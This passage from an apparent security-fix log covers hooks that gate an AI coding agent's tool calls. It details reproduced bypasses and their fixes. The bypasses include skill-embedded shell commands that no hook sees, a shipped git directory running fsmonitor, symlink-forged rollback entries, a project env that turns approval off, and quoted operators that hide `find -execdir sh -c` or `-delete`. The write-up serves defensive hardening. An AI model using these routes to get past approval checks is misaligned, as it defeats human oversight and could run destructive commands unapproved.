  the agent, leaves nothing to compare; the audit skill's records file has
  no head (its command hook refuses every command naming it but the append
  form and moving it aside).
- Tests: `tests/test_verify_audit_log.py::TestHead` (the head the hook
  writes, the verifier's report case, a cut log whose head the hook keeps,
  a removed log, a head another key signed, a log begun before the head, a
  head behind the log: all 7 failed before); three cases in
  `tests/test_pretooluse_hooks.py::test_a_call_that_writes_the_records_is_refused`
  (Write, `rm`, `mv` to `AUDIT.HEAD`; failed before), and reading the head
  passes. The restricted-PATH concurrency test lists `mv`, which the hook
  now runs; six concurrent runs keep the chain and the head.

#### 43. The binding's audit hook did not use a grounded tool's secrets (medium; partly closed by batch 6)

A deployment registers its credentials through each grounded tool's
`secrets` option; `recordToolCall`'s entry for a plain tool was redacted
with the default patterns, the layer's secrets (`configureLayer`, batch 6)
and its own argument, never with a tool's. The verifier's probe stored
`401 for key hk_live_...` in the hook's entry.

- Fix (`layer.ts`, `grounded.ts`): `registerSecrets` adds a grounded
  tool's secrets to the layer's: an array when the tool is defined, a
  function's values at each call. `layerSecrets()` gives both,
  `configureLayer` keeps the tools' (the tools stay defined) and
  `resetLayer` forgets them, so every entry the binding writes (the audit
  hook's, other tools', a control tool's) and every `persist` refusal use
  them.
- Not changed: a grounded tool returns its error to the runtime as its
  code threw it, so the model's tool message can hold a secret. That
  message is not among §6.7's places (records, anchors, notifications,
  diagnostics and `Error`s, traces, `persist` data), the Python adapter
  does not redact what a tool returns to the model either, and the
  verifier noted it as outside the list.
- Tests (`test/layer.test.ts`, "a grounded tool's secrets reach every
  entry"): the verifier's case, an array at definition reaching the hook's
  entry for `http_get` and refusing `persist` data; a function's values
  reaching it after a call, kept by `configureLayer`, forgotten by
  `resetLayer`. Both failed before. The verifier's `probe46` now finds no
  key in the grounded entry, the hook's entry or the store.

#### Siblings checked

- Both redactors, the refusal rule and the shell scan share each new rule;
  the vectors pin them for all three, and the fuzz runs above found no
  difference.
- `persistEntry`, the Python memory store, the adapter's TodoWrite check and
  the skills' hooks refuse through the shared rule, so #41's forms are
  refused there too.
- The audit skill's records chain is #42's sibling (no head); documented,
  with `--no-head`, above.

#### Documentation

SECURITY.md (§1.5: a bullet on the credential forms and encoded registered
values, the `audit` row of §5.4; §5: the audit log's head and the default
key); both redactors' module docs; the log hook's comment and
hooks/README.md (the head, the hook's reports, `--no-head`, the diagram);
the verifier's docstring and help; the persist skill's text and the audit
skill's verifier command; the binding's `secrets` option, `audit.ts`,
`layer.ts`, the binding README and the Standard Agents guide; the
`acs-core` README (`encodedForms`); CHANGELOG (Upgrading: credential forms,
the audit log's head and `--no-head`, the binding's tool secrets). The
Standard's §6.7 already forbids each leak and asks a host to recognise the
credentials it holds, and §6.4 only asks for a chain; no change there. No
version changes.

#### Checks after batch 8

- Python: `pytest tests/` (5407 passed, 18 skipped), and again the 1777
  tests that read the documents edited after it started; ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1983; the WebAssembly
  build reused); the binding's check and test (217, 2 skipped).
- Site: `npm run check`, `npm test` (1173).
- Probes (the verifier's, pointed at this worktree, each under `timeout
  120` and an address-space limit): `p1.py` finds every case of #41
  redacted and refused; the runner probe `p2.py` finds no password in any
  of its four modes; `p4.sh` flags every case but the letters-only Basic
  value in text, which the text rule leaves to data, as before, under sh
  and bash; the verifier's #42 steps (`head -n 2`, `sed -i '$d'` and one
  more call, `rm` and one more call) fail verification; `probe46` finds no
  host key in any stored entry. None left running.

### Batch 8, verified again: one sibling of #41

A later session confirmed batch 8 on 6199574 before returning: the
reported cases of #41 are redacted by both redactors and refused by
`holds_credential`, `holdsCredential` and `secret_in` under sh and bash
(identical results), the runner keeps no password in a failed step, #42's
head and #43's `registerSecrets` tests pass, and the records guard refuses
a call naming `audit.head`. One sibling of #41 was open.

#### 44. A quoted credential value was redacted to its first blank (medium; sibling of #41)

Batch 8 made `passphrase` a credential name, but in text every value rule
(an assignment, a credential option, a user option's password, a header
pair or tuple) read a value to its first blank, quote, `,` or `;` (`&` too
in an assignment), quoted or not. So `ValueError: bad config
{"passphrase": "correct horse battery staple"}` kept `horse battery
staple` in a failed step's trace, `{'password': 'it is a secret'}` kept
`is a secret`, `--password "correct horse battery"` kept two words, and a
`Cookie` pair or tuple (`[["Cookie", "theme=dark; session=..."]]`, a HAR's
`{"name": "Cookie", "value": ...}` in text) kept every cookie after the
first. Both redactors agreed (Python and TypeScript, the same output). JSON
data was not affected: a secret member's value is replaced whole.

- Fix (`redaction.py`, `redact.ts`, identically): a value that opens with a
  quote (escaped or not) is read to its closing quote of the same kind on
  its line, whitespace and all (`_quoted_value` / `quotedValue`: any
  character but that quote, a backslash or a line break, or a run of
  backslashes no such quote follows; 4 or more characters). Each of the
  four rules gains a quoted form for each quote kind, applied before its
  unquoted form (`_quoted_forms` / `quotedForms`; the pair and tuple heads
  and the assignment's prefix are named once, `_TUPLE_HEAD`, `_PAIR_HEAD`,
  `_ASSIGN`, and shared). A value whose quote does not close on its line
  is read as before, to a blank; one shorter than 4 characters is not
  read past its closing quote (`password: "x" and then "..."` is kept).
- Not changed: the refusal rule. Text's quoted values still count only
  with no whitespace (`token: "rotate monthly"` is prose and passes), so
  the shell scan and `credentials.json` are unchanged; JSON data is
  refused by its members, as before.
- Linear time: a quoted run ends at the next quote of its kind or a line
  break, so runs from different openings do not overlap; a run with no
  closing quote is read once more by the unquoted form. 8 new repeated
  shapes and 6 unclosed-quote shapes (a prefix and a 1 MB tail) in both
  timing tests: Python at most 3.1 s at 1 MB (about 1.5 times HEAD's time
  for the same text: eight more passes), 0.2 s at 100 KB, so linear.
- Tests: 4 vectors in `tests/conformance/secrets/redact.json`
  (`quoted_value_with_whitespace`, `quoted_pair_and_tuple_values`,
  `quoted_option_values`, and `quoted_value_controls`: a short quoted
  value, an unclosed quote, a line break), run by Python and the
  TypeScript package; `tests/test_runner.py::test_no_secret_in_a_failed_step`
  gains `raised_quoted_passphrase`; `test_a_quoted_credential_value_is_replaced_whole`
  and its TypeScript twin. With HEAD's redactors the first three vectors,
  the runner case and both direct tests fail; the controls pass on both.
- Parity: 4000 fuzzed strings over quotes, escaped quotes, blanks, line
  breaks, names, options and pair and tuple tokens give the same
  redaction, pointers and refusal in Python and TypeScript (0
  differences); 2 of them redact more than on HEAD, none less.
- Docs: both redactors' module docs, SECURITY.md §1.5's bullet on
  credential forms, CHANGELOG (the credential forms entry of Upgrading).
  No version changes.

#### Checks after #44

- Python: `pytest tests/` (5427 passed, 18 skipped), and again the tests
  that read the files edited after it started (`test_acs_core_package.py`,
  `test_version_lines.py`, `test_redaction.py`); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2
  skipped).
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  at most 1 MB: the batch's cases and the new quoted forms through both
  redactors and the shell scan (sh and bash), the timing shapes at 100 KB
  and 1 MB against HEAD's redactor, and the fuzz parity run above. None
  left running; the scratch files were removed.

## Round 2

### Batch 1: five reported defects

Five defects, each reproduced by an independent verifier on bfb18b1: one in
how the layers treat a call that loads commands no hook sees, four in how
repository content steers the plugin's hooks and the SDK through git. None
was fixed by an earlier batch (git log and round 1 checked). Each fix has
tests that fail on the code before it: the 90 tests of the two new files
were run with bfb18b1's hooks, rollback skill, mapper, tracker and recorder
put back, and 73 failed; the 17 that passed are the controls (an ordinary
marker, reads in the project, a repository without submodules, a signed
entry, other paths) and the fixtures' own checks (the shipped config runs
its programs; a read fetches into the submodule).

#### 1. A skill's shell commands ran with no hook (high); sibling: a subagent's hooks and MCP servers

Claude Code 2.1.330 runs the shell commands a skill's file embeds
(``!`cmd` `` and ```` ```! ```` blocks) as the skill loads: read from the
installed binary, the loader substitutes the call's arguments into the body
first (its error text names "the arguments or options substituted into
it"), then each command goes through the permission check, under the
skill's `allowed-tools`, and straight to the Bash tool's `call`, with no
PreToolUse or PostToolUse event (`tengu_prompt_shell_permission`). The
plugin's hook had `Skill` on UNGATED_TOOLS and the mapper mapped it to
`invoke` alone, so every command a skill embeds ran with no marker, no
approval and no log line, in bypassPermissions mode too. A skill preloaded
into a subagent does not run them (`isSkillPreload` sets
`readOnlySkillLoad`).

Sibling, same premise ("the calls it leads to are classified on their
own"): a subagent's definition can name `hooks` and `mcpServers` (both in
the binary's agent schema), commands Claude Code runs with no hook event
while the subagent runs; and a project's agent replaces a built-in one of
the same name (the binary merges built-in, plugin, user, project, flag and
policy agents by name, later ones winning), so no agent name is safe. Agent
and Task were ungated too.

- Fix (hook): `Skill`, `Agent` and `Task` leave UNGATED_TOOLS and are
  `mutate`, with an approval reason that says why ("the shell commands a
  skill's file embeds, and the hooks and MCP servers a subagent's
  definition names, run with no hook seeing them"). A Skill call's
  arguments are read by the records guard as a command's text is.
- Fix (SDK): `_UNSEEN_COMMANDS` (`Skill`, `Agent`, `Task`): the tool's own
  capability (`invoke`, `delegate`) and Bash's worst case, `mutate` and
  `send` (high risk, a checkpoint, approval), so a destination policy
  refuses the call (STANDARD 1.2.0 §4.4.2: the layer cannot tell where the
  commands send). The recorder still takes no checkpoint for a Skill call.
- Not covered, stated in SECURITY.md §5.5: a skill or command the person
  runs from the prompt (`/name`) is no tool call; Claude Code's
  `disableSkillShellExecution` setting turns its embedded commands off.
- Tests: `tests/test_unseen_commands.py` (the hook: F501 without a marker
  in every mode, the ask with the reason, F502 in bypassPermissions, F504
  for Skill arguments naming the records; the mapper's capabilities and
  flags for each tool and skill name; the adapter: F501, then ask with a
  checkpoint, and F504 under a destination policy), and
  `test_the_tools_that_load_unseen_commands_are_gated_in_both` in
  `tests/test_hook_lists_match_mapper.py`. Tests that stated the old
  behaviour were changed to the new one: `Skill`, `Agent` and `Task` left
  `test_a_tool_that_needs_neither_passes` (`test_pretooluse_hooks.py`) and
  `test_call_that_requires_no_approval_does_not_ask`
  (`test_tool_call_approval.py`), and `test_skill_is_invoke_whatever_the_skill`
  (`test_tool_bindings.py`) became a test of the worst case; the rate-limit
  tests of `test_sdk_e2e.py` that used Skill as a medium-risk tool use
  another one.

#### 2. A repository could make .claude a git directory: the hook ran its fsmonitor and the tracked-marker check was bypassed (high)

`git -C .claude ls-files --error-unmatch -- checkpoint.ok` asked whatever
git directory git found from `.claude`. A repository can ship `.claude`
itself as one (HEAD, objects/, refs/, an index, a config): git then read
the shipped config, ran its `core.fsmonitor` program inside the hook
(before any approval), and answered from the shipped index; with no config,
git took `.claude` for a bare repository, `ls-files` failed, and a tracked
marker the project shipped passed as untracked.

- Fix (hooks): `hgit` runs every git command of the pre-tool-use and take
  hooks with `-c core.fsmonitor=false -c core.hooksPath=/dev/null` and
  `GIT_NO_LAZY_FETCH=1` (a test keeps the two copies and the SDK's options
  the same); the rollback skill's command hook runs git with the same
  options. The marker check still asks from `.claude` (a linked or
  submodule `.claude` is read where it leads), but only when the git
  directory git finds there is one git made for a work tree
  (`git_dir_is_made`: `*/.git`, `*/.git/worktrees/*`, `*/.git/modules/*`;
  git refuses a path with a `.git` component in a repository, so no clone
  writes one): any other is F501 before `ls-files` runs. `ls-files` answers
  yes (F501) or no; any other answer is F501 too (it was "untracked").
  The take hook's `git diff --quiet HEAD` adds `--no-ext-diff
  --no-textconv`.
- The verifier's suggestion was to ask the project's repository instead;
  the git-directory rule closes both reproductions (the fsmonitor never
  runs, the bare `.claude` is refused) and keeps a linked `.claude`
  working.
- Fix (SDK): `grounded_agency/utils/git.py` (`SAFE_GIT_OPTIONS`,
  `safe_git_environment`, `git_dir_is_made`); the tracker's
  `_tracked_by_git` asks the same way (a state file in a git directory git
  did not make, or one git cannot answer for, is not loaded), and the
  recorder's `_tree_is_head` and the mapper's lookups run git with the same
  options.
- Tests: `TestShippedClaudeGitDir` in `tests/test_repository_content.py`
  (the fsmonitor sentinel is never written and the marker is refused, F501;
  the bare `.claude` with a tracked fresh marker, F501 in
  bypassPermissions; the tracker's state file in a shipped git directory is
  not trusted, and its fsmonitor does not run; an ordinary untracked marker
  still passes), and `test_both_checkpoint_hooks_run_git_alike`.

#### 3. git reads in an embedded git directory ran its config as observe (medium); sibling: `git stash create` there

The hook and the mapper classified `git status`, `git log -p`, `git show`,
`git diff`, `git ls-files` (and `git stash list|show`) as observe wherever
the call ran. In a directory of the work tree that a repository ships as a
git directory (`vendor/evil.git` with HEAD, objects/, refs/, a config and
info/attributes), git reads that config and runs its `core.fsmonitor`
(status, ls-files) and its textconv driver (log -p, show, diff). Sibling:
`git stash create` refreshes the index, so it ran the fsmonitor too, as a
`checkpoint` call, which needs nothing.

- Fix: `git_dir_is_content` (hook) and `git_dir_may_be_content` (mapper,
  a new attribute beside `git_may_fetch`, a failed lookup a yes): where the
  git directory git finds from the call's directory is not one git made for
  a work tree, every `git stash` form and every read-only git command is
  the worst case (the hook: `mutate`; the mapper: `mutate` and `send`).
  No repository there is a no, as before (`git status` outside a
  repository fails on its own).
- Why the name rule, not "differs from the project's git directory": the
  SDK knows no project directory, and a shipped git directory can never be
  a `.git` one; the rule gives the hook and the mapper the same answer.
- Tests: `TestEmbeddedGitDir` (the fixture's config runs its programs; each
  read and `git stash create`, from the git directory and from a directory
  inside it, is F501 in the hook and the worst case in the mapper, and no
  program runs; in the project they still observe; the lookup's answers).

#### 4. A shipped symbolic link let one approved `touch` forge a permanent rollback entry (medium)

The rollback check trusted any regular file in
`<git dir>/acs/checkpoints/commits/`, and the records guard read only the
call's text. A repository ships a stash-shaped merge commit M and a link
`notes/todo.md -> ../.git/acs/checkpoints/commits/M`; `touch notes/todo.md`
is an ordinary gated mutate, and once approved it creates the entry, after
which `git stash apply M` passes as a rollback, with no checkpoint and no
approval, every time.

- Fix (entries): the take hook writes in each entry the HMAC-SHA-256 of
  `acs-checkpoint-commit:<commit>` under the project's checkpoint key,
  `<git dir>/acs/checkpoints/key` (64 hex digits from `/dev/urandom`, drawn
  once and entered with `ln` so two runs agree, mode 600; a malformed key is
  replaced). The pre-tool-use hook's `recorded_commit` and the rollback
  skill's command hook pass a restore only for an entry that holds that
  HMAC (`openssl`; without it nothing is entered or recognised), and only
  in a git directory git made for a work tree (a shipped one could hold a
  key and entries of its own). An empty entry written before the upgrade
  restores nothing (a gated `mutate`; CHANGELOG Upgrading says so).
- Fix (guard): in a text of at most 4096 bytes, each word (a file tool's
  path whole; a command's or a skill's arguments as the shell passes them:
  `path_words`, quotes removed, split at blanks and `;&|<>(){}`$=`) is
  resolved from the call's directory with each symbolic link on it followed
  (`resolve_path`, no subshell, one `readlink` per link), and one that
  leads into the records is F504; so is a word whose links cannot be
  followed (a loop, more than 40 on one path, more than 200 in the call, so
  a chain named many times cannot hold the hook past its time limit). This
  closes the two-step variant: an approved `cp x notes/key.md` replacing
  the key through a link, then an entry.
- Not seen, stated in SECURITY.md §5.5: a path a command builds when it
  runs, a pattern the shell expands, a link a command reaches without
  naming it (copying a directory over one); such a command can read and
  replace the key, and is still a `mutate` a person approves.
- SDK: no sibling; the adapter's `has_commit` counts only checkpoints its
  own tracker took since it started, in memory.
- Tests: `TestCommitEntries` (a signed entry restores; an empty, junk or
  wrongly signed entry is F501 in two modes; eight commands and three file
  paths through links into the records, relative and absolute, are F504; a
  link loop; the 200-link budget, refused quickly; other paths still ask;
  400 words resolve quickly; the take hook enters nothing, writes no key
  and runs no program in a shipped git directory), and the lifecycle test
  that checks the entry's content and the key's mode;
  `test_an_unsigned_entry_restores_nothing` for the rollback skill's hook
  under sh and bash (bfb18b1's hook allowed an empty entry, exit 0, under
  both; now F503). The tests that entered commits by hand use
  `tests/conftest.py::enter_checkpoint_commit`, which signs them as the
  take hook does.

#### 5. A git read fetched from a partial-clone submodule's promisor as observe (medium; sibling of round 1 #12)

`git_may_fetch` read only the call's repository's configuration, but `git
log -p --submodule=diff` (or `diff.submodule=diff`, or `git status`) reads
a submodule's object store, where a partial clone fetches each missing
object from its promisor remote.

- Fix (hook and mapper alike): a git read also takes the worst case in a
  repository with submodules: `modules/` in its common git directory, or a
  gitlink (mode 160000) in its index (`git ls-files --stage -- :/`, run
  with `hgit`), initialised or not. The simplest fail-closed form: a read
  in a repository with submodules needs a checkpoint and approval;
  `git stash create` and a recorded restore keep their classes, as in a
  partial clone.
- Tests: `TestSubmodules` (the fixture: a full clone whose submodule was
  updated with `--filter=blob:none` from a file:// upstream, where `git log
  -p --submodule=diff` fetches; seven reads, `--sub=diff` included, are
  F501 in the hook and the worst case in the mapper; a gitlink with no
  submodule set up counts; a repository without submodules observes).

#### Siblings checked

- The other skill command hooks (audit, checkpoint, persist, send,
  transform) run no git; the log and stop hooks run none.
- The TypeScript package and the binding classify no git command and have
  no Skill or Agent tool.
- A restore into a shipped git directory: `recorded_commit` requires the
  call's git directory to equal the project's, which must be one git made.
- The take hook in a project whose git directory is shipped content writes
  no key, no entry and no marker naming a commit (tested).
- Round 1's fixes hold: the partial-clone rule (#12), the records guard's
  spellings, the tracked-marker rule, the shipped-records tests all pass
  unchanged.

#### Documentation

SECURITY.md §5.1 (classification of Skill, Agent and Task; git reads with
submodules and in shipped git directories; the records guard through links
and Skill arguments; the marker's git directory; signed entries) and §5.5
(the host gaps: what the guard does not see, the key, the person's own
slash commands; the adapter's classifier), `hooks/README.md`, the hooks'
header comments, the rollback skill's hook comment,
`docs/integrations/claude_agent_sdk.md` (the mapping table, the Skill
flow, git reads), and CHANGELOG [Unreleased] Upgrading (the SDK's Skill,
Agent and Task and Bash entries; the plugin hooks' entries). No version
changes.

#### Checks after batch 1

- Python: `pytest tests/` (5516 passed, 18 skipped), and again
  `tests/test_skill_hooks.py` after its last test was added (799 passed);
  ruff check and format with CI's lists; mypy; every `tools/validate_*.py`
  of CLAUDE.md, `validate_workflows.py --strict` and every domain catalog
  and example `--strict`; `sync_skill_schemas.py --check` and the
  generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build and test (2002; the WebAssembly
  build reused); the binding's check and test (217, 2 skipped). No
  TypeScript source changed: neither classifies git commands nor has a
  Skill or Agent tool.
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` (and a 4 GB address-space limit for the
  timing ones), inputs at most 7 KB: the `.claude` git-directory
  reproduction against bfb18b1's hook (its fsmonitor ran inside the hook)
  and the fixed one (refused, F501, nothing run); bfb18b1's and the fixed
  rollback skill hook on an empty entry under sh and bash (0, then F503);
  the pre-tool-use hook's time on a gated `touch` of 10, 400 and 900
  words (0.08 s, 0.14 s, and 0.07 s for the 4398-byte line, which is not
  resolved), on one word of 2040 path components (0.23 s), and on a git
  read (0.04 s). No CLI or nested agent was started; nothing was left
  running; the scratch repositories were removed.

### Batch 2: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1: one in
where the plugin's hooks take their settings, one in how both classifiers
read a command's name, one in how the SDK mapper reads a quoted operator,
and one in what `wrap_options()` does to the host's `setting_sources`. None
was fixed by an earlier batch (git log, round 1 and batch 1 checked; batch
1's fixes hold: its tests pass unchanged). Each fix has tests that fail on
the code before it: the 111 new tests were run with 6cf8c5d's three hooks,
mapper and adapter put back, and 77 failed; the 34 that passed are the
controls (settings set elsewhere, unrelated settings, unquoted names and
operators, `/bin/ls`), the fixtures' own checks (bash runs a program named
`git status`; `find f '<' -execdir` runs), one passthrough case the old code
already kept (`["user", "project", "local"]`), and sibling forms the old
code gated by accident (`find . -name ';' -delete` was split at the `;`,
leaving an unknown `-delete` command).

#### 6. A project's settings `env` switched the hooks' settings (low)

Claude Code applies the `env` of a project's `.claude/settings.json` and
`.claude/settings.local.json`, repository content, to every hook process it
starts, over the user's settings and the environment it started in (read
from the installed binary: `Object.assign(process.env, ...)` for every
enabled source; only the organization's managed hooks start without the
repository settings' env). The hooks read `ACS_HOOK_APPROVAL`,
`ACS_CHECKPOINT_MAX_AGE`, `AUDIT_HMAC_KEY` and `AUDIT_LOCK_WAIT` from their
environment, so a cloned repository could switch the approval floor off
(`ACS_HOOK_APPROVAL=off`: no F502 ask in default mode, no F502 block in
bypassPermissions), lengthen the maximum age, or sign the audit log with a
key it knows. No hook read the project's settings files, so none could tell
the person's value from the repository's.

- Fix (hooks): `project_layer_settings` (the same function in the
  pre-tool-use, take and log hooks; a test keeps them equal and checks that
  every `ACS_*` or `AUDIT_*` variable any hook reads is on its list) reads
  both files in `$CLAUDE_PROJECT_DIR/.claude/` (where Claude Code reads
  them: its `projectConfigDir` is the project directory it also passes as
  `CLAUDE_PROJECT_DIR`, which it sets after the env, so a project cannot
  move it) with jq and prints each of the four names their `env` holds, in
  any letter case (any JSON spelling: jq decodes `ACS_...`), or the
  file's name when jq cannot read it. While it prints anything:
  - the pre-tool-use hook blocks every call, ungated ones included (the
    record of any call would be signed with a key the repository may
    know), with `R407 SAFETY_CHECK_FAILED:` naming the settings and where
    they belong (`~/.claude/settings.json`, managed settings, the
    environment Claude Code starts in); the marker is left in place;
  - the log hook writes no line (exit 1 with the reason; the log and its
    head are left as they are);
  - the take hook writes no marker.
- Why a refusal and not "ignore the value": the hook cannot know the
  person's value either (the project's replaces it in the environment), so
  any value it used would be a guess; `AUDIT_LOCK_WAIT` is on the list
  because the test requires every setting a hook reads to be.
- Not covered, stated in SECURITY.md §5.5 and the hooks README: Claude Code
  started in the home directory reads `~/.claude/settings.json` as the
  project's settings too, so there the settings must come from the
  environment; settings Claude Code takes from elsewhere for a project are
  not read.
- Tests: `tests/test_project_settings.py` (each setting in either file, in
  another letter case, as a JSON escape and named twice, in three modes:
  R407 and the marker unused; Read, a read-only Bash and Write refused
  alike; an unreadable file refused; unrelated settings, an `env` that is
  not an object and a non-object file change nothing; the log hook writes
  no line and keeps the head; the take hook writes no marker; the controls:
  `off` from the environment still leaves approval to Claude Code, and a
  key from the environment still signs; the function-equality and
  coverage test).

#### 7. A quoted command name with a blank read as a two-word entry (medium)

The hook compared each read-only entry with `${words[0]}` and with
`${words[0]} ${words[1]}`, and the mapper's `_is_read_only` with `words[0]`
and `" ".join(words[:2])`: the single dequoted word `git status` (from
`"git status"`, `'git status'`, `g"it status"`, `git" "status`) equals the
entry "git status". Bash runs the program named `git status` from PATH, not
git; its writes and git-directory checks (keyed on `words[0] == "git"`)
were skipped too. The mapper also passed `"git branch"`, `"git remote" add
o x`, `"pip list"` and `"pip show"`.

- Fix (hook and mapper alike): a first word holding a blank (any
  whitespace) or a slash names a program on no list: the worst case
  (`mutate` in the hook, `mutate` and `send` in the mapper). A one-word
  entry is compared with the first word, a two-word entry's program and
  subcommand with the first and second words, each one word.
- Tests: `test_a_command_name_with_a_blank_or_a_slash_is_gated_in_both`
  (17 commands, hook F501 and mapper worst case),
  `test_a_quoted_name_without_a_blank_is_still_the_command` (`git
  "status"`, `"git" "status"`, `"ls" -la` stay read-only), and
  `test_bash_runs_a_program_named_with_a_blank` (the premise) in
  `tests/test_hook_lists_match_mapper.py`.

#### 8. The SDK classifier dropped the word after a quoted `<` (high); sibling: quoted separators

shlex in punctuation mode gives a quoted or escaped operator (`'<'`, `"<"`,
`\<`, `';'`, `'|'`, `'&&'`, `\;`) as the bare operator. `_simple_commands`
compared the real and masked token streams by length only, then read every
real token that looked like an operator as one: `find in.txt '<' -execdir
sh -c '...' sh {} +` skipped `-execdir` as a redirection's file and was
`observe` (the shell runs it: the verifier's probe wrote `id` output), as
were `find . ! -name '<' -delete` (deletes everything), `-fprint`, `sort
'<' -o`, and `git log '<' --output=`. The adapter allowed them with no
checkpoint, no approval and no destination check. Sibling (same cause):
a quoted separator split the line, so `grep ';' f` was two commands
(`grep`, and `f`, an unknown command: the worst case), and `find . -name
';' -delete` was gated only because its `-delete` became a command of its
own. The plugin's hook was not affected: it
gates any line holding an operator character, quoted or not.

- Fix (mapper): a token is an operator only when the masked reading has an
  operator at the same position (the two readings are always the same
  length: about 106,000 fuzzed lines of quotes, escapes and operators found no
  difference, and an operator in the masked reading always equals the real
  one); any other token is the word the shell passes. Should the readings
  ever differ in length, the line is the worst case (it fell back to
  "every word expanded", which would now have made every operator a word).
  A redirection whose file is missing or is an operator (`cat <`, `ls >
  ;`, a syntax error) is the worst case.
- Effect on read-only lines: a quoted operator in an allow-listed command
  is now a word (`grep ';' f`, `grep '|' f`, `echo '(' x` observe, where
  the last was the worst case).
- Tests: `TestQuotedOperators` in `tests/test_bash_classification.py` (the
  premise: bash runs `-execdir` past `'<'`; six lines whose following word
  is now read; seven read-only lines; unquoted operators still separate and
  redirect; a redirection with no file; the adapter denies the `-execdir`
  line with F501, and F504 under a destination policy), and
  `test_a_quoted_operator_hides_no_word_in_either` (14 lines, mapper gated
  and hook F501) in `tests/test_hook_lists_match_mapper.py`.

#### 9. `wrap_options` overrode the host's `setting_sources` (high)

`wrap_options` set `setting_sources` to the host's value or `["project"]`,
then added `"project"`: `[]` (the SDK's isolation mode, which its own
documentation names for a `cwd` that may be untrusted, since project
settings can run hooks) became `["project"]`, so the repository's
`.claude/settings.json` was loaded (its hooks run commands with no check,
its `env` and permission rules apply; the SDK runs the CLI non-interactively,
which skips the trust dialog); `None` (every source, the CLI's default)
became the project's settings alone, dropping the user's and local deny
rules and hooks; `["user"]` became `["user", "project"]`. The docstring,
the guide, SECURITY.md and the conformance statement said nothing of it.

- Fix: `setting_sources` is passed through unchanged (it is no longer in
  the replaced fields). A host that wants a project's skills loaded
  includes `"project"` itself; the docstring, the SDK guide, SECURITY.md
  §5.5 and CHANGELOG Upgrading say so. `grounded_query` and
  `GroundedClient`, which wrap default options, now keep `None`.
- Tests: `test_wrap_options_keeps_the_hosts_setting_sources` in
  `tests/test_sdk_integration.py` (`None`, `[]`, `["user"]`, `["local"]`,
  `["user", "local"]`, all three: the wrapped options keep the value, and
  the SDK transport's command line, built with `cli_path=/bin/false` and
  no process started, carries the same `--setting-sources` flag, or none
  for `None`).

#### Siblings checked

- Settings: the Python SDK and adapter read no layer setting from the
  environment (they take a `GroundedAgentConfig`; the only environment
  they touch is `GIT_NO_LAZY_FETCH` for their own git commands); the
  TypeScript package and the binding read no `process.env`. The stop hook
  and the skill command hooks read none of the settings (the audit skill's
  HMAC under `AUDIT_HMAC_KEY` is a command the agent runs, which the
  pre-tool-use hook gates). Claude Code's own lists that strip
  `BASH_ENV`, `LD_*`, `GIT_*`, `SHELLOPTS`, `PS4` and others from some
  environments were seen in the binary, statically; that a project's `env`
  cannot set them for a hook was not checked at run time (the CLI may not
  be run here).
- Names: the take hook compares `git`, `stash` and `create` word by word;
  the rollback skill's hook finds restores by the unquoted words `git stash
  pop|apply` (a quoted `"git stash" apply X` is no restore it sees, and the
  pre-tool-use hook gates it as a program on no list); the audit skill's
  hook compares one program name; `_classify_single_command` and the stash
  forms compare words exactly.
- Operators: no other SDK code splits a command line (`_tokens` and
  `_simple_commands` are its only users); the hooks refuse any operator
  character, quoted or not, before reading words.
- `wrap_options`' other fields: `enable_file_checkpointing` is set; output
  format, budget, model, turns and agents are filled only when the host
  left them unset; `allowed_tools` and the permission settings are kept.

#### Documentation

SECURITY.md §5.1 (the settings rule, the first-word rule, the log and take
hooks under project settings) and §5.5 (the host gap for the home
directory; the adapter's `setting_sources` and its reading of quoted
operators and names), `hooks/README.md` (where the settings belong, the
first-word rule, the HMAC key), the three hooks' header comments,
`docs/integrations/claude_agent_sdk.md` (the classifier's reading of quoted
operators and names; `setting_sources`), the adapter's docstring, and
CHANGELOG [Unreleased] Upgrading (the SDK's `wrap_options` and Bash
entries; the plugin hooks' entries). The Standard's text was not changed:
it states the rules these fixes apply (§5.18.3 classification to the worst
case, §5.18.7, §5.18.8 R407), not the plugin's settings or the shell's
quoting. No version changes.

#### Checks after batch 2

- Python: `pytest tests/` (5633 passed, 18 skipped), and again the three
  changed test files after the last edit (322 passed); ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check and test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2 skipped).
  No TypeScript source changed: neither reads a layer setting from the
  environment, classifies a Bash command or wraps SDK options.
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` or less (and a 4 GB address-space limit
  for the timing ones), inputs at most 564 KB: the pre-tool-use hook with a
  project `env` naming `ACS_HOOK_APPROVAL` (R407 for Bash in
  bypassPermissions and for Read), its time on a Read call (0.01 s a run;
  0.15 s with a 564 KB settings file of 5000 keys); the log hook with and
  without the project setting; the classifiers on the reported commands;
  the mapper on 4 KB lines of quoted operators (4 to 140 ms, the same as
  before the change: the 140 ms is the pattern checks that run before the
  line is read). No CLI or nested agent was started; nothing was left
  running; the scratch repositories were removed.

### Batch 3: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1: one in
how the checkpoint tracker writes its files, three in how the SDK adapter's
permission callback relates to its PreToolUse hook. None was fixed by an
earlier batch (git log, round 1 and batches 1 and 2 checked; their tests pass
unchanged). Each fix has tests that fail on the code before it: the 35 new
tests were run with e3968ef's tracker, snapshot store and adapter put back,
and 31 failed; the 4 that passed are controls (an ordinary snapshot store, an
